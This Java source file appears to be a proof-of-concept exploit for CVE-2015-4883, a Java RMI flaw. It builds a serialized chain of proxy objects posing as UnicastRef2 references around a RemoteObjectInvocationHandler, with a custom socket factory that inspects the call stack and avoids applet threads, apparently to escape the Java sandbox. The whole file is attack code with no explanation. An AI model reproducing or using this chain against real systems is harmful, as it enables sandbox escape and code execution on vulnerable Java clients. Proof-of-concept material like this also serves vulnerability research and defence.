package poc.cve_2015_4883;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutput;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.rmi.Remote;
import java.rmi.server.RMIClientSocketFactory;
import java.rmi.server.RemoteObject;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.rmi.server.RemoteRef;

public class RMIChain {
	
	@SuppressWarnings("rawtypes")
	public static byte[] createChain() throws IOException {
		final ClassLoader cl = RMIChain.class.getClassLoader();
		final Class[] remoteRef = { RemoteRef.class };
		final Class[] rcsf = { RMIClientSocketFactory.class, Remote.class };
		
		RMIClientSocketFactory ourSocketFactory = new SocketFactory();
		RemoteRef ourSocketFactoryRef = ( RemoteRef ) Proxy.newProxyInstance( cl, remoteRef, new UnicastRef2Proxy( ourSocketFactory ) );
		RemoteObjectInvocationHandler roih = new RemoteObjectInvocationHandler( ourSocketFactoryRef );
		RMIClientSocketFactory roihAsFactory = ( RMIClientSocketFactory ) Proxy.newProxyInstance( cl, rcsf, roih );
		RemoteRef proxySocketFactory = ( RemoteRef ) Proxy.newProxyInstance( cl, remoteRef, new UnicastRef2Proxy( roihAsFactory ) );
		RemoteObject root = new RemoteObjectInvocationHandler( proxySocketFactory );
		
		ByteArrayOutputStream byteOut = new ByteArrayOutputStream();
		ObjectOutputStream objectOut = new ObjectOutputStream( byteOut );
		
		objectOut.writeObject( root );
		objectOut.close();
		
		return byteOut.toByteArray();
	}
	
	public static class SocketFactory implements RMIClientSocketFactory, Serializable {
		
		private static final long serialVersionUID = -3110707456479647088L;
		
		private static boolean createdSocket = false;
		
		@Override
		public RMISocket createSocket( String host, int port ) throws IOException {
			if( SocketFactory.createdSocket || Thread.currentThread().getName().contains( "applet" ) ) {
				return null;
			}
			
			final StackTraceElement[] callStack = Thread.currentThread().getStackTrace();
			
			boolean canCreate = false;
			for ( StackTraceElement frame : callStack ) {
				if( frame.getClassName().equals( RemoteObjectInvocationHandler.class.getName() ) ) {
					canCreate = true;
					break;
				}
			}
			if( !canCreate ) {
				return null;
			}
			
			SocketFactory.createdSocket = true;
			
			return new RMISocket( );
		}
		
	}
	
	public static class UnicastRef2Proxy implements InvocationHandler {
		
		private RMIClientSocketFactory socketFactory;
		
		public UnicastRef2Proxy( RMIClientSocketFactory socketFactory ) {
			this.socketFactory = socketFactory;
		}
		
		@Override
		public Object invoke( Object proxy, Method method, Object[] args ) throws Throwable {
			final String methodName = method.getName();
			if ( methodName.equals( "getRefClass" ) ) {
				return "UnicastRef2";
			}
			else if ( methodName.equals( "writeExternal" ) ) {
				ObjectOutput out = ( ObjectOutput ) args[ 0 ];
				
				// TCP Endpoint data
				out.writeByte( 1 ); // Type
				out.writeUTF( "" ); // Host
				out.writeInt( 0 ); // Port
				out.writeObject( this.socketFactory ); // RMIClientSocketFactory
				
				// ObjID data
				out.writeLong( 0 ); // Object ID
				
				// UID data
				out.writeInt( 0 ); // Unique
				out.writeLong( 0 ); // Time
				out.writeShort( 0 ); // Count
				
				// LiveRef data
				out.writeBoolean( false );
				return null;
			}
			throw new AssertionError( "Unhandled method invocation: " + method );
		}
		
	}
	
}
